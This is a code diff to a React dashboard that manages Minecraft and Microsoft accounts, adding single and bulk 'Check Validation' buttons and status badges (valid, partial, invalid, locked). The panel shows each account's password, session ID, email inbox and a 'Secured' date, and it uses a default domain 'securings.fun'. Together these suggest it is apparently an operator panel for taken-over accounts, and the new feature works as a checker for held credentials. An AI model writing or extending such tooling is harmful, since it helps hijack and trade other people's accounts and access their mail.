@@ -3,6 +3,7 @@ import { ReactSkinview3d } from "react-skinview3d";
 import {
   Search, Download, Check, Copy, Link2, Lock, X, Power, ArrowLeft,
   Loader2, RotateCcw, Mail, ChevronRight, Trash2, CheckSquare, Filter,
+  ShieldCheck,
 } from "lucide-react";
 import { toast } from "sonner";
 import { cn, simplify } from "@/lib/utils";
@@ -38,7 +39,54 @@ export type Account = {
   ms_subscriptions_commercial?: string;
   mc_ssid?: string;
   mc_uchange?: string;
+  validation_status?: string | null;
+  validation_detail?: string | null;
+  validated_at?: string | null;
 };
+
+export type ValidationStatus = "valid" | "partial" | "invalid" | "locked" | "unknown";
+
+export function validationBadgeStyle(status?: string | null): {
+  label: string;
+  color: string;
+  bg: string;
+  border: string;
+} | null {
+  const s = (status || "").toLowerCase();
+  if (s === "valid") {
+    return {
+      label: "Valid",
+      color: "#16a34a",
+      bg: "color-mix(in oklab, #16a34a 18%, transparent)",
+      border: "color-mix(in oklab, #16a34a 45%, transparent)",
+    };
+  }
+  if (s === "partial") {
+    return {
+      label: "Partial",
+      color: "#ca8a04",
+      bg: "color-mix(in oklab, #eab308 18%, transparent)",
+      border: "color-mix(in oklab, #eab308 50%, transparent)",
+    };
+  }
+  if (s === "invalid") {
+    return {
+      label: "Invalid",
+      color: "#dc2626",
+      bg: "color-mix(in oklab, #ef4444 18%, transparent)",
+      border: "color-mix(in oklab, #ef4444 45%, transparent)",
+    };
+  }
+  if (s === "locked") {
+    return {
+      label: "Locked",
+      color: "#dc2626",
+      bg: "color-mix(in oklab, #ef4444 18%, transparent)",
+      border: "color-mix(in oklab, #ef4444 45%, transparent)",
+    };
+  }
+  return null;
+}
 
 /** gamepass | owned (purchased / java) | no_mc (none or check failed) */
 type McCategory = "gamepass" | "owned" | "no_mc";
@@ -564,7 +612,17 @@ function GameStatsSection({ accountId, mcName }: { accountId: string; mcName?: s
   );
 }
 
-export function AccountDetail({ account, onBack, onDeleted }: { account: Account; onBack: () => void; onDeleted: () => void }) {
+export function AccountDetail({
+  account,
+  onBack,
+  onDeleted,
+  onValidated,
+}: {
+  account: Account;
+  onBack: () => void;
+  onDeleted: () => void;
+  onValidated?: (patch: Pick<Account, "validation_status" | "validation_detail" | "validated_at">) => void;
+}) {
   const [detail, setDetail] = useState<Account>(account);
   const [emails, setEmails] = useState<EmailEntry[]>([]);
   const [showMail, setShowMail] = useState(false);
@@ -576,6 +634,41 @@ export function AccountDetail({ account, onBack, onDeleted }: { account: Account
   const [shareLinks, setShareLinks] = useState<any[]>([]);
   const [domain, setDomain] = useState("securings.fun");
   const [deleting, setDeleting] = useState(false);
+  const [validating, setValidating] = useState(false);
+
+  async function handleValidate() {
+    setValidating(true);
+    try {
+      const res = await fetch("/api/accounts/validate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", ...authHeaders() },
+        body: JSON.stringify({ account_ids: [account.account_id] }),
+      });
+      const body = await res.json().catch(() => null);
+      if (!res.ok) throw new Error(body?.detail || "Validation failed");
+      const result = body?.results?.[0];
+      if (!result) throw new Error("No validation result");
+      if (result.status !== "unknown") {
+        const patch = {
+          validation_status: result.status as string,
+          validation_detail: result.detail as string,
+          validated_at: new Date().toISOString(),
+        };
+        setDetail((prev) => ({ ...prev, ...patch }));
+        onValidated?.(patch);
+      }
+      const badge = validationBadgeStyle(result.status);
+      const msg = `${badge?.label || result.status}: ${result.detail || ""}`;
+      if (result.status === "valid") toast.success(msg);
+      else if (result.status === "partial") toast.warning(msg);
+      else if (result.status === "unknown") toast(msg);
+      else toast.error(msg);
+    } catch (err) {
+      toast.error(err instanceof Error ? err.message : "Validation failed");
+    } finally {
+      setValidating(false);
+    }
+  }
 
   async function handleDelete() {
     const label = detail.mc_name || detail.ms_email || "this account";
@@ -722,8 +815,41 @@ export function AccountDetail({ account, onBack, onDeleted }: { account: Account
           <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: "0.75rem" }}>
             <div className="db-detail-heading" style={{ flex: 1, minWidth: 0 }}>
               {detail.mc_name || detail.ms_email || "—"}
+              {(() => {
+                const badge = validationBadgeStyle(detail.validation_status);
+                if (!badge) return null;
+                return (
+                  <span
+                    title={detail.validation_detail || badge.label}
+                    style={{
+                      marginLeft: "0.55rem",
+                      display: "inline-flex",
+                      verticalAlign: "middle",
+                      alignItems: "center",
+                      padding: "0.15rem 0.5rem",
+                      borderRadius: 999,
+                      fontSize: "0.65rem",
+                      fontWeight: 700,
+                      letterSpacing: "0.02em",
+                      color: badge.color,
+                      background: badge.bg,
+                      border: `1px solid ${badge.border}`,
+                    }}
+                  >
+                    {badge.label}
+                  </span>
+                );
+              })()}
             </div>
-            <div style={{ display: "flex", gap: "0.5rem", flexShrink: 0, marginTop: "0.15rem" }}>
+            <div style={{ display: "flex", gap: "0.5rem", flexShrink: 0, marginTop: "0.15rem", flexWrap: "wrap" }}>
+              <button
+                onClick={handleValidate}
+                disabled={validating}
+                style={{ display: "inline-flex", alignItems: "center", gap: "0.35rem", padding: "0.35rem 0.75rem", fontSize: "0.7rem", fontWeight: 600, borderRadius: "6px", border: "1px solid color-mix(in oklab, #0ea5e9 40%, transparent)", background: "color-mix(in oklab, #0ea5e9 12%, transparent)", color: "#0284c7", cursor: validating ? "not-allowed" : "pointer", opacity: validating ? 0.6 : 1, transition: "all 0.2s" }}
+              >
+                {validating ? <Loader2 className="h-3 w-3 animate-spin" /> : <ShieldCheck className="h-3 w-3" />}
+                {validating ? "Checking…" : "Check Validation"}
+              </button>
               <button onClick={() => {
                 const json = JSON.stringify(detail, null, 2);
                 const blob = new Blob([json], { type: "application/json" });
@@ -771,6 +897,17 @@ export function AccountDetail({ account, onBack, onDeleted }: { account: Account
             <div className="db-detail-stat-block">
               <div className="db-detail-stat-label">Secured</div>
               <CopyableValue value={detail.secured_at?.slice(0, 16).replace("T", " ")} />
+            </div>
+            <div className="db-detail-stat-block">
+              <div className="db-detail-stat-label">Validation</div>
+              <CopyableValue
+                value={
+                  detail.validation_status
+                    ? `${String(detail.validation_status).toUpperCase()}${detail.validation_detail ? ` — ${detail.validation_detail}` : ""}`
+                    : "Not checked"
+                }
+                muted={!detail.validation_status}
+              />
             </div>
             <div className="db-detail-stat-block">
               <div className="db-detail-stat-label">Password</div>
@@ -1019,6 +1156,7 @@ export function Accounts() {
   const [selectedIds, setSelectedIds] = useState<Set<string>>(new Set());
   const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
   const [bulkDeleting, setBulkDeleting] = useState(false);
+  const [bulkValidating, setBulkValidating] = useState(false);
   const [showBar, setShowBar] = useState(false);
   const [barStyle, setBarStyle] = useState<React.CSSProperties>({});
   const [marquee, setMarquee] = useState<{ x: number; y: number; w: number; h: number } | null>(null);
@@ -1251,6 +1389,54 @@ export function Accounts() {
     }
   }
 
+  async function handleBulkValidate() {
+    const ids = [...selectedIds];
+    if (ids.length === 0) return;
+    if (ids.length > 25) {
+      toast.error("Max 25 accounts per validation. Deselect some first.");
+      return;
+    }
+    setBulkValidating(true);
+    try {
+      const res = await fetch("/api/accounts/validate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json", ...authHeaders() },
+        body: JSON.stringify({ account_ids: ids }),
+      });
+      const body = await res.json().catch(() => null);
+      if (!res.ok) throw new Error(body?.detail || "Validation failed");
+      const results: Array<{ account_id: string; status: string; detail?: string }> = body?.results || [];
+      const byId = new Map(results.map((r) => [r.account_id, r]));
+      const now = new Date().toISOString();
+      setAccounts((prev) =>
+        prev.map((a) => {
+          const r = byId.get(a.account_id);
+          if (!r || r.status === "unknown") return a;
+          return {
+            ...a,
+            validation_status: r.status,
+            validation_detail: r.detail ?? null,
+            validated_at: now,
+          };
+        }),
+      );
+      const counts = { valid: 0, partial: 0, invalid: 0, locked: 0, unknown: 0 };
+      for (const r of results) {
+        const k = (r.status || "unknown") as keyof typeof counts;
+        if (k in counts) counts[k] += 1;
+        else counts.unknown += 1;
+      }
+      toast.success(
+        `Checked ${results.length}: ${counts.valid} valid, ${counts.partial} partial, ${counts.invalid} invalid, ${counts.locked} locked` +
+          (counts.unknown ? `, ${counts.unknown} unknown` : ""),
+      );
+    } catch (err) {
+      toast.error(err instanceof Error ? err.message : "Validation failed");
+    } finally {
+      setBulkValidating(false);
+    }
+  }
+
   useEffect(() => {
     try { localStorage.setItem(LS_EXCLUDE_DUPES, excludeDuplicates ? "1" : "0"); } catch { /* ignore */ }
   }, [excludeDuplicates]);
@@ -1313,6 +1499,12 @@ export function Accounts() {
         onDeleted={() => {
           setAccounts(prev => prev.filter(a => a.account_id !== selected.account_id));
           prevCount.current = Math.max(0, prevCount.current - 1);
+        }}
+        onValidated={(patch) => {
+          setAccounts((prev) =>
+            prev.map((a) => (a.account_id === selected.account_id ? { ...a, ...patch } : a)),
+          );
+          setSelected((prev) => (prev ? { ...prev, ...patch } : prev));
         }}
       />
     );
@@ -1518,7 +1710,32 @@ export function Accounts() {
                     <span className="db-acct-time">{a.secured_at?.slice(0, 10) ?? "—"}</span>
                   </div>
                   <div className="db-acct-info-section">
-                    <div className="db-acct-name">{a.mc_name || a.mc_gamertag || "—"}</div>
+                    <div className="db-acct-name" style={{ display: "flex", alignItems: "center", gap: "0.4rem", flexWrap: "wrap" }}>
+                      <span>{a.mc_name || a.mc_gamertag || "—"}</span>
+                      {(() => {
+                        const badge = validationBadgeStyle(a.validation_status);
+                        if (!badge) return null;
+                        return (
+                          <span
+                            title={a.validation_detail || badge.label}
+                            style={{
+                              display: "inline-flex",
+                              alignItems: "center",
+                              padding: "0.1rem 0.4rem",
+                              borderRadius: 999,
+                              fontSize: "0.6rem",
+                              fontWeight: 700,
+                              letterSpacing: "0.02em",
+                              color: badge.color,
+                              background: badge.bg,
+                              border: `1px solid ${badge.border}`,
+                            }}
+                          >
+                            {badge.label}
+                          </span>
+                        );
+                      })()}
+                    </div>
                     <div className="db-acct-stats">
                       <div className="db-acct-stat">
                         <div className="db-acct-stat-label">Email</div>
@@ -1564,8 +1781,17 @@ export function Accounts() {
               </span>
               <div className="h-6 w-px bg-border/40" />
               <button
+                onClick={handleBulkValidate}
+                disabled={bulkValidating || bulkDeleting}
+                className="inline-flex cursor-pointer items-center gap-2 rounded-lg bg-sky-600/90 px-4 py-2 text-xs font-semibold text-white transition hover:bg-sky-600 disabled:cursor-not-allowed disabled:opacity-60"
+              >
+                {bulkValidating ? <Loader2 className="h-4 w-4 animate-spin" /> : <ShieldCheck className="h-4 w-4" />}
+                {bulkValidating ? "Checking…" : "Check Validation"}
+              </button>
+              <button
                 onClick={() => setShowDeleteConfirm(true)}
-                className="inline-flex cursor-pointer items-center gap-2 rounded-lg bg-red-600/90 px-4 py-2 text-xs font-semibold text-white transition hover:bg-red-600"
+                disabled={bulkValidating || bulkDeleting}
+                className="inline-flex cursor-pointer items-center gap-2 rounded-lg bg-red-600/90 px-4 py-2 text-xs font-semibold text-white transition hover:bg-red-600 disabled:cursor-not-allowed disabled:opacity-60"
               >
                 <Trash2 className="h-4 w-4" />
                 Delete
